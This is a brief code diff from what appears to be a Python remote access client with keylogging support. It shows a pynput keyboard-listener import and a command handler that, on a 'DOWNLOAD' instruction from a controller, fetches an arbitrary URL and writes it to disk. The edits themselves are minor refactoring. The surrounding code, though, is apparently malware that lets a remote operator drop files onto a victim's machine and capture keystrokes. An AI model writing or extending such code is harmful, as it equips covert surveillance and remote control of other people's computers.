@@ -39,7 +39,7 @@ if platform.system() == 'Windows':
 try:
     from pynput.keyboard import Listener
     _PYNPUT = True
-except Exception:
+except ImportError:
     _PYNPUT = False
 
 logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
@@ -394,9 +394,9 @@ class Client(object):
             if data[0] == 'DOWNLOAD':
                 logging.info('Downloading "%s" from %s', data[2], data[1])
                 try:
-                    r = requests.get(data[1])
+                    request = requests.get(data[1])
                     with open(data[2], 'wb') as f:
-                        f.write(r.content)
+                        f.write(request.content)
                 except Exception as err:
                     self.send_json([False, errors(err, line=False)])
                     continue
